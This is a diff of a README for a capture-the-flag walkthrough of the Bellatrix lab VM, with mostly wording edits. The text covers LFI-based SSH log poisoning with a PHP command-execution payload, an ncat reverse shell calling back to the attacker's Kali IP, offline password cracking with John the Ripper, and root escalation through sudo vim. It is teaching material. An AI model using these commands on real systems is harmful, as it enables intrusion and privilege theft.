@@ -43,7 +43,7 @@ The following steps will be followed for the activity:
 The first step is to identify the IP of the Kali machine we are working on and of the Bellatrix Machine:
 
 - IP Kali Machine &rarr; We run the `ifconfig` command which shows the IP address and various details about it and find that the Kali Machine is located at the address 10.0.2.15
-- IP Bellatrix Machine &rarr; We execute the command `netdiscover -r 10.0.2.0/24`, that is a tool that can scan and monitor network traffic using ARP requests, we find that the Bellatrix machine is located at the address 10.0.2.14, in fact the MAC address coincides with the one set in the VM
+- IP Bellatrix Machine &rarr; We execute the command `netdiscover -r 10.0.2.0/24`, that is a tool that can scan and monitor network traffic using ARP requests, and find that the Bellatrix machine is located at the address 10.0.2.14, in fact the MAC address coincides with the one set in the VM
 
 
  ![netdiscover+ifconfig](https://github.com/lorenzodiaz2/Cybersecurity_Lab/blob/main/images/netdiscover%2Bifconfig.png)
@@ -92,15 +92,15 @@ As we know, the URL is vulnerable to LFI, so we can access any file from the tar
 
 Now that we can access the *auth.log* file, let’s see the working of SSH log poisoning.  
 
-If we try anything related to authentication, the server will log it in *auth.log* file. First, i will try to authenticate as a random user with `ssh randomuser@10.0.2.14` command and then, since the injected file is included by the PHP script, if we inject a PHP code, the webserver will execute that as well, so we try to do that with `ssh '<?php system($_GET['cmd']); ?>'@10.0.2.14` command, where the user part is a PHP code for executing any file we pass in variable **cmd**:
-- `system( )` is a PHP function that allows the execution of shell commands
+If we try anything related to authentication, the server will log it in *auth.log* file. First, i will try to authenticate as a random user with `ssh randomuser@10.0.2.14` command and then, since the injected file is included by the PHP script, if we inject a PHP code, the webserver will execute that as well, so we try to do that with `ssh '<?php system($_GET['cmd']); ?>'@10.0.2.14` command, where the user part is a PHP code for executing any command we pass in **cmd** parameter:
+- `system( )` is a PHP function that allows the execution of shell commands and display the output
 - `$_GET['cmd']` code retrieves the value of the query parameter **cmd** from the URL’s    
 
 
 
 **Issue**: running the second command, I encounter the following error in the local machine:  
 `remote username contains invalid characters`  
-This error suggests that the SSH client is rejecting the username due to the presence of special characters, which are part of the PHP code I'm trying to inject. This was a vulnerability that is now patched from upstream `ssh`.  
+This error suggests that the SSH client is rejecting the username due to the presence of special characters, which are part of the PHP code I'm trying to inject. This is a vulnerability that is now patched from upstream `ssh`.  
 >   For more details of the patch for this vulnerability check the function `valid_ruser()` in this [link](https://github.com/openssh/openssh-portable/commit/7ef3787c84b6b524501211b11a26c742f829af1a).
 
 We need a workaround!
@@ -129,14 +129,14 @@ At this point, if we return to the *auth.log* file, we can see new entries relat
 
 ### 5. Obtaining Reverse Shell
 
-Now, it’s time to take the reverse shell. We want to arrive at the scenario where on the Kali Machine there is a listener (a server) listening on a certain port and on the Bellatrix Machine there is a Reverse Shell.    
+Now, it’s time to take the reverse shell. We want to arrive at the scenario where on the Kali Machine there is a listener (a server) listening on a certain port and on the Bellatrix Machine there is a Reverse Shell connected to Kali Machine.    
 I have used Netcat as listener, a command-line utility that reads and writes data across network connections using the TCP or UDP protocols, so in the terminal of Kali Machine we execute `nc -lvp 1234` command, in which:
- - *-l* stands for ”listen”, tells *nc* to go into listen mode
+ - *-l* stands for "listen", tells *nc* to go into listen mode
  - *-v* stands for "verbose", makes *nc* more verbose showing additional connection status messages
  - *-p* specifies the port on which *nc* should listen, 1234 in this case 
 
 
-After that we must execute some code on the Bellatrix Machine to open a connection with the Kali Machine on port 1234 and spawn a process that executes */bin/bash* and we do this by injecting code directly into the log URL. The code we inject is `ncat -e /bin/bash 10.0.2.15 1234`, where:
+After that we have to execute some code on the Bellatrix Machine to open a connection with the Kali Machine on port 1234 and spawn a process that executes */bin/bash* and we do this by injecting code directly into the log URL. The code we inject is `ncat -e /bin/bash 10.0.2.15 1234`, where:
  - *ncat* is an advanced implementation of *nc* that offers many additional features
  - *-e* followed by */bin/bash* specifies to run the *bin/bash* program as a child process when a connection is established
  - 10.0.2.15 is the IP of the Kali Machine
@@ -152,36 +152,38 @@ We can use `python3 -c 'import pty;pty.spawn("/bin/bash")'` command, in which:
 
 ### 6. Privilege Escalation
 
-Once we have an interactive shell we can list the contents of the current directory and notice that, in addition to the *.php* and *.gif* files, there is another directory owned by root, so we change directory with the `cd` command and list the contents of the folder.
-We find 2 files, so print their contents with the `cat` command. 
+Once we have an interactive shell we can list the contents of the current directory and notice that, in addition to the *.php* and *.gif* files, there is another directory owned by *root*, so we change directory with the `cd` command and list the contents of the folder.  
+We find 2 files, so print their contents with `cat` command. 
 
 
 ![priv-esc](https://github.com/lorenzodiaz2/Cybersecurity_Lab/blob/main/images/priv-esc.png)  
 
 
-We can note that:
+We can notice that:
 - *.secret.dic* is a dictionary-type file that contains a list of words
 - *Swordofgryffindor* is a file containing *lestrange* and a value that could be obtained by computing the hash of the password of user *lestrange*
 
-then with the **nano** editor we create two local files on the Kali Machine:
+so, with the cracking software **John the Ripper** we can try to perform *Password Cracking: Offline Guessing*.  
+With the **nano** editor we create two local files on the Kali Machine:
 - *hash*: copy of *Swordofgryffindor*
 - *dict.txt*: copy of .secret.dic
 
-and with the cracking software **John the Ripper** we try to run *Password Cracking: Offline Guessing* with the command `john --wordlist=dict.txt hash`, where *--wordlist* specifies the path to the dictionary file.
-We get the password of user *lestrange*.
+and run the command `john --wordlist=dict.txt hash`, where *--wordlist* specifies the path to the dictionary file.  
 
 ![johntheripper](https://github.com/lorenzodiaz2/Cybersecurity_Lab/blob/main/images/johntheripper.png)
+
+We get the password of user *lestrange*.
 
 
 > The reason I didn't run *Oflline Guessing* directly in the *netcat* shell is because the `john` command wasn't installed and the *Bellatrix* user doesn't have privileges to install it
 
 
-Now the scenario is: we have the credentials of the user *lestrange*.
+Now the scenario is that we have the credentials of user *lestrange*.
 Then, in the shell obtained with *netcat*, we execute the command `su lestrange`, used to switch from the current user to the *lestrange* user. To figure out what privileges *lestrange* has on the system, we run the command `sudo -l` that list user's privilege or check a specific command, and find that user *lestrange* has permission to run `vim` command from any host and as any user without password request.
 
 We can exploit these privileges by running the command `sudo vim -c ':!/bin/sh'`, obtaining an interactive shell with root privileges, in fact:
 
-- *sudo* allows you to execute commands with the privileges of another user, root by default
+- *sudo* allows executing commands with the privileges of another user, *root* by default
 - *vim* is a text editor
 - *-c* followed by *':!/bin/sh'* specifies a command to run after starting *vim*
 
@@ -192,12 +194,12 @@ and so what happens step by step is:
 4. `:!/bin/sh` command opens a shell with root privileges
     
 
-Once we arrive in the scenario where we have a shell open with root privileges, we move to the */root* directory, list its contents and print the flag.
+Once we arrive in the scenario where we have a shell open with *root* privileges, we move to the */root* directory, list its contents and print the flag.
 
 ![flag](https://github.com/lorenzodiaz2/Cybersecurity_Lab/blob/main/images/flag.png)
 
 
-We have gained root access and read root flag. This completes the challenge! 
+We have gained root access and read *root* flag. This completes the challenge! 
 
 
 ## Credits
